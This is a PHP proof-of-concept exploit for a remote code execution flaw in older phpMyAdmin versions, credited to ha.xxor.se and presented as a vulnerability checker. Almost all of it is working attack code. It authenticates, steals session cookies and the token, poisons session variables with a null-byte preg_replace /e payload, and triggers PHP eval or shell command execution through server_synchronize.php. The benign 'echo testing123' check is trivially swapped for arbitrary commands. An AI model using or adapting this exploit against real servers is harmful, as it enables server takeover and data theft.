<?php echo php_sapi_name()!=='cli'?'<pre>':'';?>
              .
       ,      )\     .
  .  ,/)   , /  ) ,  )\
  )\(  /)/( (__( /( /  )          __      __              ________        __                    __
 /  \  (   )|  |)  \  /          |  |\  /|  |            |  |  |  |      |  |                  (__)
(  ______ / |  |_____(  ______   |  | \/ |  |  __    __  |  |__|  |   ___|  |  __ ___________   __   __ _____
 \|  | \  \ |  |  |  |)|  | \  \ |  |    |  | |  |  |  | |  |  |  | /  / |  | |  |  |  |  |  | |  | |  |  |  |
  |  |_/__/ |__|  |__| |  |_/__/ |__|    |__| |__|__|  | |__|  |__| \__\_|__| |__|  |__|  |__| |__| |__|  |__|
==|__|=================|__|=========================|__|======================================================    
 _   _  ___ __ ____ __ ___  ___       
| |-| || _ |\   /\   /| _ ||   )      
|_|-|_||_|_|/_._\/_._\|___||_|_\      
 ___  ___  ___ _  _  ___     ___ __ __  
(  < | [_ /  /| || ||   )(_)|   |\ | /
 >__)|_[_ \__\|____||_|_\|_| |_|  |_|
http://ha.xxor.se
phpMyAdmin < 3.3.10.2 || phpMyAdmin < 3.4.3.1                               
Remote Code Execution POC Vulnerability Test            

Will only confirm if the instance is exploitable or not.			   
Use responsibly.

<?php echo php_sapi_name()!=='cli'?'</pre>':'';   

if(php_sapi_name()==='cli'){
	$args = getopt("h:u:p:s:");

	if(!(isset($args['h']) && isset($args['u']) && isset($args['p']))){
		?>
	
   Usage
   <?php echo $argv[0];?> -h URL -u USER -p PASS [-s] -c PHP-CODE
    -h    URL     -  http://example.com/phpMyAdmin-3.3.9.2
    -u    User    -  root
    -p    Pass    -  mypassword
   Optional
    -s    Set to test with a shell command instead of php code.

<?php
		killme();
	}
	$pmaurl = $args['h'];
	$user	= $args['u'];
	$pass   = $args['p'];
	$comm   = 'echo testing123;';
	$atck   = isset($args['s'])?'php':'shell';
	
}else{
	$pmaurl = isset($_REQUEST['url'])?$_REQUEST['url']:'';
	$user	= isset($_REQUEST['user'])?$_REQUEST['user']:'root';
	$pass   = isset($_REQUEST['pass'])?$_REQUEST['pass']:'';
	$comm   = 'echo testing123;';
	$atck   = isset($_REQUEST['atck'])?$_REQUEST['atck']:'shell';
}
$cookie = null;
$token  = null;

if(!function_exists('curl_init')){
	output('[!] Fatal error. Need cURL!');
	killme();
}
$ch     = curl_init();
$debug  = 0;
if(php_sapi_name()!=='cli'){
?>
<form method=post>
URL: <input name=url value="<?php echo htmlspecialchars($pmaurl);?>"> Example: http://localhost:8080/www/root/phpMyAdmin-3.3.9.2<br/>
User:<input name=user value="<?php echo htmlspecialchars($user);?>"> <br />
Pass:<input name=pass value="<?php echo htmlspecialchars($pass);?>"> <br />
<input type="radio" name="atck" <?php if($atck==='php')echo 'CHECKED';?> value="php" /> eval php-code<br />
<input type="radio" name="atck" <?php if($atck!=='php')echo 'CHECKED';?> value="shell" /> shell command<br />
Command:<input name=comm value="<?php echo htmlspecialchars($comm);?>"> <br />
<input name=submit type=submit value=&#9829;>
</form>
<pre>
<?php
if(!isset($_REQUEST['submit']))killme(true);
}

output("[i] Running...");

/*========================================================================================================
========================================================================================================*/

// Login
curl_setopt_array($ch, array(
	CURLOPT_POST => 1,
	CURLOPT_URL => $pmaurl.'/index.php',
	CURLOPT_HEADER => 1,
	CURLOPT_RETURNTRANSFER => 1,
	CURLOPT_FOLLOWLOCATION => 0,
	CURLOPT_TIMEOUT => 10,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_SSL_VERIFYHOST => false,
	CURLOPT_POSTFIELDS => 'pma_username='.urlencode($user).'&pma_password='.urlencode($pass)
));

output("[*] Contacting server to authenticate.");
$result = getCurlResult($ch);

// Extract cookies
preg_match('/pma_mcrypt_iv=[^;]+; /', $result, $matches); // Fixa regexp
$cookie = $matches[0];
preg_match('/phpMyAdmin=[^;]+; /', $result, $matches); // Fixa regexp
$cookie .= $matches[0];
preg_match('/pmaUser-[^;]+; /', $result, $matches); // Fixa regexp
$cookie .= $matches[0];
preg_match('/pmaPass-([^;]+)/', $result, $matches); // Fixa regexp
$cookie .= $matches[0];
output("[i] Cookie:".$cookie);
// Extract token
preg_match('/(token=|token" value=")([0-9a-f]{32})/', $result, $matches);
$token = $matches[2];
output("[i] Token:".$token);

curl_setopt_array($ch, array(
	CURLOPT_POSTFIELDS => 'token='.$token,
	CURLOPT_COOKIE => $cookie
));

$trg_db = $atck==='php' ? '\`.eval($_POST["comm"]);//'."\x00" : "$comm && echo \`;//"."\x00";
//output($trg_db);
/*========================================================================================================
========================================================================================================*/

curl_setopt($ch, CURLOPT_URL, $pmaurl.'/?session_to_unset=0'.
									  '&_SESSION[trg_db]='.urlencode($trg_db).
                                      '&_SESSION[src_uncommon_tables][0]=||/e%00'.
									  '&_SESSION[uncommon_tables][0]=1'
);
output('[*] Contacting server to poison some _SESSION variables.');
$result = getCurlResult($ch);

/*========================================================================================================
========================================================================================================*/

curl_setopt($ch, CURLOPT_URL, $pmaurl.'/server_synchronize.php?synchronize_db=1');
if($atck==='php'){
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$token.'&comm='.urlencode($comm));
}

output("[*] Contacting server to execute command.");
$result = getCurlResult($ch);

if(stristr($result, 'class="loginform"')){
	output('[!] Authentication error. Wrong password maby.');
	killme();
}

$catch_output = $atck==='php' ? '/0px"> (.*)<p>/s' : '/<p>(.*)<\/p>/s';
preg_match($catch_output, $result, $matches);

if(preg_match('/testing123/', $matches[1])){
	output("[!] Code execution successfull. This instance of phpMyAdmin is vulnerable!");
}else{
	output("[!] Code execution failed. This instance of phpMyAdmin does not apear to be vulnerable.");
}

//output("[*] Command output:\n".$matches[1]);

/*========================================================================================================
========================================================================================================*/







function getCurlResult($ch){
	global $debug;
	$result = curl_exec($ch);
	if($debug)echo htmlspecialchars($result,ENT_QUOTES);
	if(200 != curl_getinfo($ch, CURLINFO_HTTP_CODE) &&
	   301 != curl_getinfo($ch, CURLINFO_HTTP_CODE) &&
	   302 != curl_getinfo($ch, CURLINFO_HTTP_CODE)){
		output("[!] Fail. request returned ".curl_getinfo($ch, CURLINFO_HTTP_CODE).". The host is not vulnerable or there is a problem with the supplied url.");
		killme();
	}
	if(!$result){
		output("[!] cURL error:".curl_error($ch));
		killme();
	}
	return $result;
}

function output($msg){
	echo php_sapi_name()!=='cli'?htmlspecialchars("$msg\n",ENT_QUOTES):"$msg\n";
	flush();
}

function killme($b=false){
	if(!$b)output("[*] Exiting...");
	echo php_sapi_name()!=='cli'?'<pre>':'';
	die();
}

echo php_sapi_name()!=='cli'?'<pre>':'';?>